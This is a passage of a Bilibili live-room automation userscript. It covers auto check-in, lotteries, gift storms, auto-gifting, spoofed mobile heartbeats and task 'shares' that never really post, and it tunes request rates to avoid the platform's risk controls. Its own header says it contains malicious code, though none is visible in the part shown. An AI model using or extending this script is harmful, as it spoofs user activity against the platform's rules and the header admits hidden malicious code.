// ==UserScript==
// @name         Bilibili直播间挂机助手-魔改
// @namespace    SeaLoong
// @version      2.4.5.10
// @description  Bilibili直播间自动签到，领瓜子，参加抽奖，完成任务，送礼，自动点亮勋章，挂小心心等，包含恶意代码
// @author       SeaLoong,lzghzr,pjy612
// @updateURL    https://raw.githubusercontent.com/pjy612/Bilibili-LRHH/master/Bilibili%E7%9B%B4%E6%92%AD%E9%97%B4%E6%8C%82%E6%9C%BA%E5%8A%A9%E6%89%8B-%E9%AD%94%E6%94%B9.user.js
// @downloadURL  https://raw.githubusercontent.com/pjy612/Bilibili-LRHH/master/Bilibili%E7%9B%B4%E6%92%AD%E9%97%B4%E6%8C%82%E6%9C%BA%E5%8A%A9%E6%89%8B-%E9%AD%94%E6%94%B9.user.js
// @homepageURL  https://github.com/pjy612/Bilibili-LRHH
// @supportURL   https://github.com/pjy612/Bilibili-LRHH/issues
// @include      /https?:\/\/live\.bilibili\.com\/[blanc\/]?[^?]*?\d+\??.*/
// @include      /https?:\/\/api\.live\.bilibili\.com\/_.*/
// @require      https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js
// @require      https://cdn.jsdelivr.net/gh/pjy612/Bilibili-LRHH/BilibiliAPI_Plus.js
// @require      https://cdn.jsdelivr.net/gh/SeaLoong/Bilibili-LRHH/OCRAD.min.js
// @require      https://cdn.jsdelivr.net/gh/lzghzr/TampermonkeyJS/libBilibiliToken/libBilibiliToken.user.js
// @run-at       document-idle
// @license      MIT License
// @connect      passport.bilibili.com
// @connect      api.live.bilibili.com
// @grant        GM_xmlhttpRequest
// ==/UserScript==
/*
瓜子初始化失败问题自行替换上方对应OCRAD源
[github源]
// @require      https://raw.githubusercontent.com/SeaLoong/Bilibili-LRHH/master/OCRAD.min.js
[gitee源]
// @require      https://gitee.com/SeaLoong/Bilibili-LRHH/raw/master/OCRAD.min.js
[腾讯云源]
// @require      https://js-1258131272.file.myqcloud.com/OCRAD.min.js
[jsDelivr源]
// @require      https://cdn.jsdelivr.net/gh/SeaLoong/Bilibili-LRHH/OCRAD.min.js
*/
(function BLRHH_Plus() {
    'use strict';
    const NAME = 'BLRHH-Plus';
    const VERSION = '2.4.5.10';
    try{
        var tmpcache = JSON.parse(localStorage.getItem(`${NAME}_CACHE`));
        const t = Date.now() / 1000;
        if (t - tmpcache.unique_check >= 0 && t - tmpcache.unique_check <= 60) {
            console.error('魔改脚本重复运行')
            return;
        }
    }catch(e){
    }
    let scriptRuning = false;
    let API;
    let TokenUtil;
    let Token;
    const window = typeof unsafeWindow === 'undefined' ? window : unsafeWindow;
    const isSubScript = () => window.frameElement && window.parent[NAME] && window.frameElement[NAME];

    const DEBUGMODE = false || window.top.localStorage.getItem('BLRHH-DEBUG');
    const DEBUG = (sign, ...data) => {
        if (!DEBUGMODE) return;
        let d = new Date();
        d = `[${NAME}]${(isSubScript() ? 'SubScript:' : '')}[${d.getHours()}:${d.getMinutes()}:${d.getSeconds()}:${d.getMilliseconds()}]`;
        if (data.length === 1) console.debug(d, `${sign}:`, data[0]);
        else console.debug(d, `${sign}:`, data);
    };

    let CONFIG;
    let CACHE;
    let Info = {
        short_id: undefined,
        roomid: undefined,
        uid: undefined,
        ruid: undefined,
        rnd: undefined,
        csrf_token: undefined,
        visit_id: undefined,
        silver: undefined,
        gold: undefined,
        mobile_verify: undefined,
        identification: undefined,
        gift_list: undefined,
        gift_list_str: '礼物对照表',
        blocked: false,
        awardBlocked:false,
        appToken: undefined
    };
    const getAccessToken = async () => {
        if(Token && TokenUtil){
            const userToken = await Token.getToken();
            if (userToken === undefined){
                console.error('未获取到移动端token,部分功能可能失效');
            }
            return userToken;
        }
        return null;
    };

    const tz_offset = new Date().getTimezoneOffset() + 480;

    const ts_s = () => Math.round(ts_ms() / 1000);

    const ts_ms = () => Date.now();

    const getCookie = (name) => {
        let arr;
        const reg = new RegExp(`(^| )${name}=([^;]*)(;|$)`);
        if ((arr = document.cookie.match(reg))) {
            return unescape(arr[2]);
        } else {
            return null;
        }
    };

    const delayCall = (callback, delay = 10e3) => {
        const p = $.Deferred();
        setTimeout(() => {
            const t = callback();
            if (t && t.then) t.then((arg1, arg2, arg3, arg4, arg5, arg6) => p.resolve(arg1, arg2, arg3, arg4, arg5, arg6));
            else p.resolve();
        }, delay);
        return p;
    };

    const checkNewDay = (ts) => {
        // 检查是否为新的一天，以UTC+8为准
        const t = new Date(ts);
        t.setMinutes(t.getMinutes() + tz_offset);
        t.setHours(0, 0, 0, 0);
        const d = new Date();
        d.setMinutes(t.getMinutes() + tz_offset);
        return (d - t > 86400e3);
    };

    const runTomorrow = (callback) => {
        const t = new Date();
        t.setMinutes(t.getMinutes() + tz_offset);
        t.setDate(t.getDate() + 1);
        t.setHours(0, 1, 0, 0);
        t.setMinutes(t.getMinutes() - tz_offset);
        setTimeout(callback, t - ts_ms());
        DEBUG('runTomorrow', t.toString());
    };
    if (!isSubScript()) {
        const runUntilSucceed = (callback, delay = 0, period = 100) => {
            setTimeout(() => {
                if (!callback()) runUntilSucceed(callback, period, period);
            }, delay);
        };

        const addCSS = (context) => {
            const style = document.createElement('style');
            style.type = 'text/css';
            style.innerHTML = context;
            document.getElementsByTagName('head')[0].appendChild(style);
        };

        const Essential = {
            init: () => {
                return Essential.Toast.init().then(() => {
                    return Essential.AlertDialog.init().then(() => {
                        return Essential.Config.init().then(() => {
                            Essential.DataSync.init();
                            Essential.Cache.load();
                            Essential.Config.load();
                        });
                    });
                });
            },
            Toast: {
                init: () => {
                    try {
                        const toastList = [];
                        window.toast = (msg, type = 'info', timeout = 3e3) => {
                            let d = new Date().toLocaleTimeString();
                            switch (type) {
                                case 'success':
                                case 'info':
                                    console.info(`[${NAME}][${d}]${msg}`);
                                    break;
                                case 'caution':
                                    console.warn(`[${NAME}][${d}]${msg}`);
                                    break;
                                case 'error':
                                    console.error(`[${NAME}][${d}]${msg}`);
                                    break;
                                default:
                                    type = 'info';
                                    console.log(`[${NAME}][${d}]${msg}`);
                            }
                            if (CONFIG && !CONFIG.SHOW_TOAST) return;
                            const a = $(`<div class="link-toast ${type} fixed"><span class="toast-text">${msg}</span></div>`)[0];
                            document.body.appendChild(a);
                            a.style.top = (document.body.scrollTop + toastList.length * 40 + 10) + 'px';
                            a.style.left = (document.body.offsetWidth + document.body.scrollLeft - a.offsetWidth - 5) + 'px';
                            toastList.push(a);
                            setTimeout(() => {
                                a.className += ' out';
                                setTimeout(() => {
                                    toastList.shift();
                                    toastList.forEach((v) => {
                                        v.style.top = (parseInt(v.style.top, 10) - 40) + 'px';
                                    });
                                    $(a).remove();
                                }, 200);
                            }, timeout);
                        };
                        return $.Deferred().resolve();
                    } catch (err) {
                        console.error(`[${NAME}]初始化浮动提示时出现异常`);
                        console.error(`[${NAME}]`, err);
                        return $.Deferred().reject();
                    }
                }
            }, // Need Init
            AlertDialog: {
                init: () => {
                    try {
                        const div_background = $(`<div id="${NAME}_alertdialog"/>`);
                        div_background[0].style = 'display: table;position: fixed;height: 100%;width: 100%;top: 0;left: 0;font-size: 12px;z-index: 10000;background-color: rgba(0,0,0,.5);';
                        const div_position = $('<div/>');
                        div_position[0].style = 'display: table-cell;vertical-align: middle;';
                        const div_style = $('<div/>');
                        div_style[0].style = 'position: relative;top: 50%;width: 40%;padding: 16px;border-radius: 5px;background-color: #fff;margin: 0 auto;';
                        div_position.append(div_style);
                        div_background.append(div_position);

                        const div_title = $('<div/>');
                        div_title[0].style = 'position: relative;padding-bottom: 12px;';
                        const div_title_span = $('<span>提示</span>');
                        div_title_span[0].style = 'margin: 0;color: #23ade5;font-size: 16px;';
                        div_title.append(div_title_span);
                        div_style.append(div_title);

                        const div_content = $('<div/>');
                        div_content[0].style = 'display: inline-block;vertical-align: top;font-size: 14px;overflow: auto;height: 300px;';
                        div_style.append(div_content);

                        const div_button = $('<div/>');
                        div_button[0].style = 'position: relative;height: 32px;margin-top: 12px;';
                        div_style.append(div_button);

                        const button_ok = $('<button><span>确定</span></button>');
                        button_ok[0].style = 'position: absolute;height: 100%;min-width: 68px;right: 0;background-color: #23ade5;color: #fff;border-radius: 4px;font-size: 14px;border: 0;cursor: pointer;';
                        div_button.append(button_ok);

                        window.alertdialog = (title, content) => {
                            div_title_span.html(title);
                            div_content.html(content);
                            button_ok.click(() => {
                                $(`#${NAME}_alertdialog`).remove();
                            });
                            $('body > .link-popup-ctnr').first().append(div_background);
                        };
                        return $.Deferred().resolve();
                    } catch (err) {
                        window.toast('初始化帮助界面时出现异常', 'error');
                        console.error(`[${NAME}]`, err);
                        return $.Deferred().reject();
                    }
                }
            }, // Need Init After Toast.init
            Config: {
                CONFIG_DEFAULT: {
                    DD_BP:true,
                    DD_DM_STORM:true,
                    AUTO_SIGN: true,
                    AUTO_TREASUREBOX: true,
                    AUTO_GROUP_SIGN: true,
                    MOBILE_HEARTBEAT: true,
                    AUTO_LOTTERY: true,
                    AUTO_LOTTERY_CONFIG: {
                        SLEEP_RANGE:"",
                        GIFT_LOTTERY: true,
                        GIFT_LOTTERY_CONFIG: {
                            REFRESH_INTERVAL: 0
                        },
                        GUARD_AWARD: true,
                        GUARD_AWARD_CONFIG: {
                            LISTEN_NUMBER: 1,
                            CHANGE_ROOM_INTERVAL: 60
                        },
                        PK_AWARD:true,
                        MATERIAL_OBJECT_LOTTERY: true,
                        MATERIAL_OBJECT_LOTTERY_CONFIG: {
                            CHECK_INTERVAL: 10,
                            IGNORE_QUESTIONABLE_LOTTERY: true
                        },
                        STORM:false,
                        STORM_CONFIG:{
                            STORM_QUEUE_SIZE:3,
                            STORM_MAX_COUNT:100,
                            STORM_ONE_LIMIT:180,
                        },
                        HIDE_POPUP: true
                    },
                    AUTO_TASK: true,
                    AUTO_GIFT: false,
                    AUTO_GIFT_CONFIG: {
                        ROOMID: [0],
                        EXCLUDE_ROOMID:[0],
                        GIFT_INTERVAL:10,
                        GIFT_LIMIT:86400,
                        GIFT_SORT:true,
                        AUTO_LIGHT:true,
                        SEND_ALL: false
                    },
                    SILVER2COIN: false,
                    AUTO_DAILYREWARD: true,
                    AUTO_DAILYREWARD_CONFIG: {
                        LOGIN: true,
                        WATCH: true,
                        COIN: false,
                        COIN_CONFIG: {
                            NUMBER: 5
                        },
                        SHARE: true
                    },
                    SHOW_TOAST: true
                },
                NAME: {
                    DD_BP:'BiliPush推送',
                    DD_DM_STORM:'DD弹幕风暴',
                    AUTO_SIGN: '自动签到',
                    AUTO_TREASUREBOX: '自动领取银瓜子',
                    AUTO_GROUP_SIGN: '自动应援团签到',
                    MOBILE_HEARTBEAT: '移动端心跳',
                    AUTO_LOTTERY: '自动抽奖',
                    AUTO_LOTTERY_CONFIG: {
                        SLEEP_RANGE:'休眠时间',
                        GIFT_LOTTERY: '礼物抽奖',
                        GIFT_LOTTERY_CONFIG: {
                            REFRESH_INTERVAL: '刷新间隔'
                        },
                        GUARD_AWARD: '舰队领奖',
                        GUARD_AWARD_CONFIG: {
                            LISTEN_NUMBER: '监听倍数',
                            CHANGE_ROOM_INTERVAL: '换房间隔'
                        },
                        PK_AWARD:'乱斗领奖',
                        MATERIAL_OBJECT_LOTTERY: '实物抽奖',
                        MATERIAL_OBJECT_LOTTERY_CONFIG: {
                            CHECK_INTERVAL: '检查间隔',
                            IGNORE_QUESTIONABLE_LOTTERY: '忽略存疑的抽奖'
                        },
                        STORM:'节奏风暴',
                        STORM_CONFIG:{
                            STORM_QUEUE_SIZE:'同时参与数',
                            STORM_MAX_COUNT:'最大次数',
                            STORM_ONE_LIMIT:'尝试间隔',
                        },
                        HIDE_POPUP: '隐藏抽奖提示框'
                    },
                    AUTO_TASK: '自动完成任务',
                    AUTO_GIFT: '自动送礼物',
                    AUTO_GIFT_CONFIG: {
                        ROOMID: '优先房间号',
                        EXCLUDE_ROOMID:'排除房间号',
                        GIFT_INTERVAL:'检查间隔(分钟)',
                        GIFT_SORT:'优先高等级',
                        GIFT_LIMIT:'到期时间(秒)',
                        AUTO_LIGHT:'自动点亮勋章',
                        SEND_ALL: '送满全部勋章'
                    },
                    SILVER2COIN: '银瓜子换硬币',
                    AUTO_DAILYREWARD: '自动每日奖励',
                    AUTO_DAILYREWARD_CONFIG: {
                        LOGIN: '登录',
                        WATCH: '观看',
                        COIN: '投币',
                        COIN_CONFIG: {
                            NUMBER: '数量'
                        },
                        SHARE: '分享'
                    },
                    SHOW_TOAST: '显示浮动提示'
                },
                PLACEHOLDER: {
                    AUTO_LOTTERY_CONFIG: {
                        SLEEP_RANGE:'时间范围03:00-08:00',
                        GIFT_LOTTERY_CONFIG: {
                            REFRESH_INTERVAL: '单位(分钟)'
                        },
                        GUARD_AWARD_CONFIG: {
                            LISTEN_NUMBER: '1~5，默认1',
                            CHANGE_ROOM_INTERVAL: '单位(分钟)'
                        },
                        MATERIAL_OBJECT_LOTTERY_CONFIG: {
                            CHECK_INTERVAL: '单位(分钟)'
                        },
                        STORM_CONFIG:{
                            STORM_QUEUE_SIZE:'',
                            STORM_MAX_COUNT:'',
                            STORM_ONE_LIMIT:'单位（毫秒）',
                        },
                    },
                    AUTO_GIFT_CONFIG: {
                        ROOMID: '为0不送礼',
                        GIFT_DEFAULT: '为空默认不送',
                        GIFT_ALLOWED: '为空允许所有'
                    }
                },
                HELP: {
                    DD_BP:'魔改助手核心监控，启用后由服务器推送全区礼物/舰队/PK（但需要验证使用者身份并带有DD传送门等附加功能）',
                    DD_DM_STORM:'DD弹幕风暴（娱乐功能），配合DD传送门进行人力节奏风暴，用于活跃直播间气氛。',
                    MOBILE_HEARTBEAT: '发送移动端心跳数据包，可以完成双端观看任务',
                    AUTO_LOTTERY: '设置是否自动参加抽奖功能，包括礼物抽奖、活动抽奖、实物抽奖<br>会占用更多资源并可能导致卡顿，且有封号风险',
                    AUTO_LOTTERY_CONFIG: {
                        SLEEP_RANGE:'休眠时间范围，英文逗号分隔<br>例如：<br>3:00-8:00,16:50-17:30<br>表示 3:00-8:00和16:50-17:30不进行礼物检测。<br>小时为当天只能为0-23,如果要转钟请单独配置aa:aa-23:59,00:00-bb:bb',
                        GIFT_LOTTERY: '包括小电视、摩天大楼、C位光环及其他可以通过送礼触发广播的抽奖<br>内置几秒钟的延迟',
                        GIFT_LOTTERY_CONFIG: {
                            REFRESH_INTERVAL: '设置页面自动刷新的时间间隔，设置为0则不启用，单位为分钟<br>太久导致页面崩溃将无法正常运行脚本'
                        },
                        GUARD_AWARD_CONFIG: {
                            LISTEN_NUMBER: '设置在各大分区中的每一个分区监听的直播间的数量，1~5之间的一个整数<br>可能导致占用大量内存或导致卡顿',
                            CHANGE_ROOM_INTERVAL: '设置在多久之后改变监听的房间，单位为分钟，0表示不改变'
                        },
                        MATERIAL_OBJECT_LOTTERY: '部分房间设有实物奖励抽奖，脚本使用穷举的方式检查是否有实物抽奖<br>请注意中奖后记得及时填写相关信息领取实物奖励',
                        MATERIAL_OBJECT_LOTTERY_CONFIG: {
                            CHECK_INTERVAL: '每次穷举实物抽奖活动ID的时间间隔，单位为分钟',
                            IGNORE_QUESTIONABLE_LOTTERY: '对部分实物抽奖的标题存在疑问，勾选后不参加这部分抽奖'
                        },
                        STORM:'尝试参与节奏风暴<br>如果出现验证码提示的话请尝试实名制后再试',
                        STORM_CONFIG:{
                            STORM_QUEUE_SIZE:'允许同时参与的风暴次数<br>超过容量时自动丢弃最早参与的风暴，避免同时请求过多造成风控',
                            STORM_MAX_COUNT:'单个风暴最大尝试次数',
                            STORM_ONE_LIMIT:'单个风暴参与次数间隔（毫秒）',
                        },
                        HIDE_POPUP: '隐藏位于聊天框下方的抽奖提示框<br>注意：脚本参加抽奖后，部分抽奖仍然可以手动点击参加，为避免小黑屋，不建议点击'
                    },
                    AUTO_GIFT_CONFIG: {
                        ROOMID: '数组,优先送礼物的直播间ID(即地址中live.bilibili.com/后面的数字), 设置为0则无优先房间，小于0也视为0（因为你没有0的勋章）<br>例如：17171,21438956<br>不管[优先高等级]如何设置，会根据[送满全部勋章]（补满或者只消耗当日到期）条件去优先送17171的，再送21438956<br>之后根据[优先高等级]决定送高级还是低级',
                        EXCLUDE_ROOMID: '数组,排除送礼的直播间ID(即地址中live.bilibili.com/后面的数字)，填写的直播间不会自动送礼',
                        GIFT_INTERVAL:'检查间隔(分钟)',
                        GIFT_SORT:'打钩优先赠送高等级勋章，不打勾优先赠送低等级勋章',
                        GIFT_LIMIT:'到期时间范围（秒），86400为1天，时间小于1天的会被送掉',
                        GIFT_DEFAULT: () => (`设置默认送的礼物类型编号，多个请用英文逗号(,)隔开，为空则表示默认不送出礼物<br>${Info.gift_list_str}`),
                        GIFT_ALLOWED: () => (`设置允许送的礼物类型编号(任何未在此列表的礼物一定不会被送出!)，多个请用英文逗号(,)隔开，为空则表示允许送出所有类型的礼物<br><br>${Info.gift_list_str}`),
                        SEND_ALL: '打钩 送满全部勋章，否则 送出包裹中今天到期的礼物(会送出"默认礼物类型"之外的礼物，若今日亲密度已满则不送)',
                        AUTO_LIGHT:'自动用小心心点亮亲密度未满且未被排除的灰掉的勋章'
                    },
                    SILVER2COIN: '用银瓜子兑换硬币，每天只能兑换一次<br>700银瓜子兑换1个硬币',
                    AUTO_DAILYREWARD: '自动完成每日经验的任务',
                    AUTO_DAILYREWARD_CONFIG: {
                        LOGIN: '自动完成登录任务(凌晨的时候不一定能完成)',
                        WATCH: '自动完成观看任务(凌晨的时候不一定能完成)',
                        COIN: '对你关注的动态中最新几期的视频投币，直到投完设定的数量',
                        SHARE: '自动分享你关注的动态中最新一期的视频(可以完成任务，但实际上不会出现这条动态)'
                    },
                    SHOW_TOAST: '选择是否显示浮动提示，但提示信息依旧会在控制台显示'
                },
                showed: false,
                init: () => {
                    try {
                        const p = $.Deferred();
                        const getConst = (itemname, obj) => {
                            if (itemname.indexOf('-') > -1) {
                                const objname = itemname.match(/(.+?)-/)[1];
                                if (objname && obj[objname]) return getConst(itemname.replace(`${objname}-`, ''), obj[objname]);
                                else return undefined;
                            }
                            if (typeof obj[itemname] === 'function') return obj[itemname]();
                            return obj[itemname];
                        };
                        const recur = (cfg, element, parentname = undefined) => {
                            for (const item in cfg) {
                                let itemname;
                                if (parentname) itemname = `${parentname}-${item}`;
                                else itemname = item;
                                const id = `${NAME}_config_${itemname}`;
                                const name = getConst(itemname, Essential.Config.NAME);
                                const placeholder = getConst(itemname, Essential.Config.PLACEHOLDER);
                                let e;
                                let h;
                                if (getConst(itemname, Essential.Config.HELP)) h = $(`<div class="${NAME}_help" id="${id}_help" style="display: inline;"><span class="${NAME}_clickable">?</span></div>`);
                                switch ($.type(cfg[item])) {
                                    case 'number':
                                    case 'string':
                                        e = $(`<div class="${NAME}_setting_item"></div>`);
                                        e.html(`<label style="display: inline;" title="${name}">${name}<input id="${id}" type="text" class="${NAME}_input_text" placeholder="${placeholder}"></label>`);
                                        if (h) e.append(h);
                                        element.append(e);
                                        break;
                                    case 'boolean':
                                        e = $(`<div class="${NAME}_setting_item"></div>`);
                                        e.html(`<label style="display: inline;" title="${name}"><input id="${id}" type="checkbox" class="${NAME}_input_checkbox">${name}</label>`);
                                        if (h) e.append(h);
                                        element.append(e);
                                        if (getConst(`${itemname}_CONFIG`, Essential.Config.NAME)) $(`#${id}`).addClass(`${NAME}_control`);
                                        break;
                                    case 'array':
                                        e = $(`<div class="${NAME}_setting_item"></div>`);
                                        e.html(`<label style="display: inline;" title="${name}">${name}<input id="${id}" type="text" class="${NAME}_input_text" placeholder="${placeholder}"></label>`);
                                        if (h) e.append(h);
                                        element.append(e);
                                        break;
                                    case 'object':
                                        e = $(`<div id="${id}" style="margin: 0px 0px 8px 12px;"/>`);
                                        element.append(e);
                                        recur(cfg[item], e, itemname);
                                        break;
                                }
                            }
                        };
                        runUntilSucceed(() => {
                            try {
                                let findSp = false;
                                let blancFrames = $('iframe');
                                if(blancFrames && blancFrames.length>0){
                                    blancFrames.each((k,v)=>{
                                        if(v.src.includes('/blanc/')){
                                            findSp = true;
                                            window.toast('检查到特殊活动页，尝试跳转...', 'info',5e3);
                                            setTimeout(()=>{
                                                location.replace(v.src);
                                            },10);
                                            return false;
                                        }
                                    });
                                }
                                if(findSp) {
                                    p.reject();
                                    return true;
                                }
                                //if (!$('#sidebar-vm div.side-bar-cntr')[0]) return false;
                                if (!$('#sidebar-vm')[0]) return false;
                                // 加载css
                                addCSS(`.${NAME}_clickable {font-size: 12px;color: #0080c6;cursor: pointer;text-decoration: underline;}
.${NAME}_setting_item {margin: 6px 0px;}
.${NAME}_input_checkbox {vertical-align: bottom;}
.${NAME}_input_text {margin: -2px 0 -2px 4px;padding: 0;}`);
                                // 绘制右下角按钮
                                const div_button_span = $('<span>魔改助手设置</span>');
                                div_button_span[0].style = 'font-size: 12px;line-height: 16px;color: #0080c6;';
                                const div_button = $('<div/>');
                                div_button[0].style = 'cursor: pointer;text-align: center;padding: 0px;';
                                const div_side_bar = $('<div/>');
                                div_side_bar[0].style = 'width: 56px;height: 32px;overflow: hidden;position: fixed;right: 0px;bottom: 10%;padding: 4px 4px;background-color: rgb(255, 255, 255);z-index: 10001;border-radius: 8px 0px 0px 8px;box-shadow: rgba(0, 85, 255, 0.0980392) 0px 0px 20px 0px;border: 1px solid rgb(233, 234, 236);';
                                div_button.append(div_button_span);
                                div_side_bar.append(div_button);
                                //$('#sidebar-vm div.side-bar-cntr').first().after(div_side_bar);
                                $('#sidebar-vm').after(div_side_bar);
                                // 绘制设置界面
                                const div_position = $('<div/>');
                                div_position[0].style = 'display: none;position: fixed;height: 300px;width: 350px;bottom: 5%;z-index: 9999;';
                                const div_style = $('<div/>');
                                div_style[0].style = 'display: block;overflow: hidden;height: 300px;width: 350px;border-radius: 8px;box-shadow: rgba(106, 115, 133, 0.219608) 0px 6px 12px 0px;border: 1px solid rgb(233, 234, 236);background-color: rgb(255, 255, 255);';
                                div_position.append(div_style);
                                document.body.appendChild(div_position[0]);
                                // 绘制标题栏及按钮
                                const div_title = $('<div/>');
                                div_title[0].style = 'display: block;border-bottom: 1px solid #E6E6E6;height: 35px;line-height: 35px;margin: 0;padding: 0;overflow: hidden;';
                                const div_title_span = $('<span style="float: left;display: inline;padding-left: 8px;font: 700 14px/35px SimSun;">Bilibili直播间挂机助手-魔改</span>');
                                const div_title_button = $('<div/>');
                                div_title_button[0].style = 'float: right;display: inline;padding-right: 8px;';
                                const div_button_line = $(`<div style="display: inline;"></div>`);
                                const span_button_state = $(`<span class="${NAME}_clickable">统计</span>`)
                                div_button_line.append(span_button_state);
                                div_button_line.append("&nbsp;&nbsp;");
                                const span_button_clear = $(`<span class="${NAME}_clickable">清除缓存</span>`)
                                div_button_line.append(span_button_clear);
                                div_title_button.append(div_button_line);
                                div_title.append(div_title_span);
                                div_title.append(div_title_button);
                                div_style.append(div_title);
                                // 绘制设置项内容
                                const div_context_position = $('<div/>');
                                div_context_position[0].style = 'display: block;position: absolute;top: 36px;width: 100%;height: calc(100% - 36px);';
                                const div_context = $('<div/>');
                                div_context[0].style = 'height: 100%;overflow: auto;padding: 0 12px;margin: 0px;';
                                div_context_position.append(div_context);
                                div_style.append(div_context_position);
                                recur(Essential.Config.CONFIG_DEFAULT, div_context);
                                // 设置事件
                                div_button.click(() => {
                                    if (!Essential.Config.showed) {
                                        Essential.Config.load();
                                        div_position.css('right', div_side_bar[0].clientWidth + 'px');
                                        div_position.show();
                                        div_button_span.text('点击保存设置');
                                        div_button_span.css('color', '#ff8e29');
                                    } else {
                                        Essential.Config.save();
                                        div_position.hide();
                                        div_button_span.text('魔改助手设置');
                                        div_button_span.css('color', '#0080c6');
                                        BiliPushUtils.Check.sleepTimeRangeBuild();
                                        if(CONFIG.DD_BP){
                                            BiliPush.connectWebsocket(true);
                                        }else if(BiliPush.gsocket) {
                                            BiliPush.gsocket.close();
                                        }
                                    }
                                    Essential.Config.showed = !Essential.Config.showed;
                                });
                                span_button_clear.click(() => {
                                    Essential.Cache.clear();
                                    location.reload();
                                });
                                span_button_state.click(()=>{
                                    Statistics.showDayGifts();
                                });
                                const getItemByElement = (element) => element.id.replace(`${NAME}_config_`, '');
                                const getItemByHelpElement = (element) => element.id.replace(`${NAME}_config_`, '').replace('_help', '');
                                $(`.${NAME}_help`).click(function () {
                                    window.alertdialog('说明', getConst(getItemByHelpElement(this), Essential.Config.HELP));
                                });
                                $(`.${NAME}_control`).click(function () {
                                    if ($(this).is(':checked')) {
                                        $(`#${NAME}_config_${getItemByElement(this)}_CONFIG`).show();
                                    } else {
                                        $(`#${NAME}_config_${getItemByElement(this)}_CONFIG`).hide();
                                    }
                                });
                                p.resolve();
                                return true;
                            } catch (err) {
                                window.toast('初始化设置界面时出现异常', 'error');
                                console.error(`[${NAME}]`, err);
                                p.reject();
                                return true;
                            }
                        });
                        return p;
                    } catch (err) {
                        window.toast('初始化设置时出现异常', 'error');
                        console.error(`[${NAME}]`, err);
                        return $.Deferred().reject();
                    }
                },
                recurLoad: (cfg, parentname = undefined, cfg_default = Essential.Config.CONFIG_DEFAULT) => {
                    for (const item in cfg_default) {
                        let itemname;
                        if (parentname) itemname = `${parentname}-${item}`;
                        else itemname = item;
                        const e = $(`#${NAME}_config_${itemname}`);
                        if (!e[0]) continue;
                        if (cfg[item] === undefined) cfg[item] = Essential.Config._copy(cfg_default[item]);
                        switch ($.type(cfg[item])) {
                            case 'number':
                            case 'string':
                                e.val(cfg[item]);
                                break;
                            case 'boolean':
                                e.prop('checked', cfg[item]);
                                if (e.is(':checked')) $(`#${NAME}_config_${itemname}_CONFIG`).show();
                                else $(`#${NAME}_config_${itemname}_CONFIG`).hide();
                                break;
                            case 'array':
                                e.val(cfg[item].join(','));
                                break;
                            case 'object':
                                Essential.Config.recurLoad(cfg[item], itemname, cfg_default[item]);
                                break;
                        }
                    }
                },
                recurSave: (cfg, parentname = undefined, cfg_default = Essential.Config.CONFIG_DEFAULT) => {
                    if (Object.prototype.toString.call(cfg) !== '[object Object]') return cfg;
                    for (const item in cfg_default) {
                        let itemname;
                        if (parentname) itemname = `${parentname}-${item}`;
                        else itemname = item;
                        const e = $(`#${NAME}_config_${itemname}`);
                        if (!e[0]) continue;
                        switch ($.type(cfg[item])) {
                            case 'string':
                                cfg[item] = e.val() || '';
                                break;
                            case 'number':
                                cfg[item] = parseFloat(e.val());
                                if (isNaN(cfg[item])) cfg[item] = 0;
                                break;
                            case 'boolean':
                                cfg[item] = e.is(':checked');
                                break;
                            case 'array':
                                var value = e.val().replace(/(\s|\u00A0)+/, '');
                                if (value === '') {
                                    cfg[item] = [];
                                }
                                else{
                                    cfg[item] = value.split(',');
                                    cfg[item].forEach((v, i) => {
                                        cfg[item][i] = parseFloat(v);
                                        if (isNaN(cfg[item][i])) cfg[item][i] = 0;
                                    });
                                }
                                break;
                            case 'object':
                                cfg[item] = Essential.Config.recurSave(cfg[item], itemname, cfg_default[item]);
                                break;
                        }
                        if (cfg[item] === undefined) cfg[item] = Essential.Config._copy(cfg_default[item]);
                    }
                    return cfg;
                },
                fix: (config) => {
                    // 修正设置项中不合法的参数，针对有输入框的设置项
                    if (config.AUTO_LOTTERY_CONFIG.GUARD_AWARD_CONFIG.LISTEN_NUMBER === undefined) config.AUTO_LOTTERY_CONFIG.GUARD_AWARD_CONFIG.LISTEN_NUMBER = Essential.Config.CONFIG_DEFAULT.AUTO_LOTTERY_CONFIG.GUARD_AWARD_CONFIG.LISTEN_NUMBER;
                    config.AUTO_LOTTERY_CONFIG.GUARD_AWARD_CONFIG.LISTEN_NUMBER = parseInt(config.AUTO_LOTTERY_CONFIG.GUARD_AWARD_CONFIG.LISTEN_NUMBER, 10);
                    if (config.AUTO_LOTTERY_CONFIG.GUARD_AWARD_CONFIG.LISTEN_NUMBER < 1) config.AUTO_LOTTERY_CONFIG.GUARD_AWARD_CONFIG.LISTEN_NUMBER = 1;
                    else if (config.AUTO_LOTTERY_CONFIG.GUARD_AWARD_CONFIG.LISTEN_NUMBER > 5) config.AUTO_LOTTERY_CONFIG.GUARD_AWARD_CONFIG.LISTEN_NUMBER = 5;

                    if (config.AUTO_LOTTERY_CONFIG.GIFT_LOTTERY_CONFIG.REFRESH_INTERVAL === undefined) config.AUTO_LOTTERY_CONFIG.GIFT_LOTTERY_CONFIG.REFRESH_INTERVAL = Essential.Config.CONFIG_DEFAULT.AUTO_LOTTERY_CONFIG.GIFT_LOTTERY_CONFIG.REFRESH_INTERVAL;
                    config.AUTO_LOTTERY_CONFIG.GIFT_LOTTERY_CONFIG.REFRESH_INTERVAL = parseInt(config.AUTO_LOTTERY_CONFIG.GIFT_LOTTERY_CONFIG.REFRESH_INTERVAL, 10);
                    if (config.AUTO_LOTTERY_CONFIG.GIFT_LOTTERY_CONFIG.REFRESH_INTERVAL < 0) config.AUTO_LOTTERY_CONFIG.GIFT_LOTTERY_CONFIG.REFRESH_INTERVAL = 0;

                    if (config.AUTO_LOTTERY_CONFIG.GUARD_AWARD_CONFIG.CHANGE_ROOM_INTERVAL === undefined) config.AUTO_LOTTERY_CONFIG.GUARD_AWARD_CONFIG.CHANGE_ROOM_INTERVAL = Essential.Config.CONFIG_DEFAULT.AUTO_LOTTERY_CONFIG.GUARD_AWARD_CONFIG.CHANGE_ROOM_INTERVAL;
                    config.AUTO_LOTTERY_CONFIG.GUARD_AWARD_CONFIG.CHANGE_ROOM_INTERVAL = parseInt(config.AUTO_LOTTERY_CONFIG.GUARD_AWARD_CONFIG.CHANGE_ROOM_INTERVAL, 10);
                    if (config.AUTO_LOTTERY_CONFIG.GUARD_AWARD_CONFIG.CHANGE_ROOM_INTERVAL < 0) config.AUTO_LOTTERY_CONFIG.GUARD_AWARD_CONFIG.CHANGE_ROOM_INTERVAL = 0;

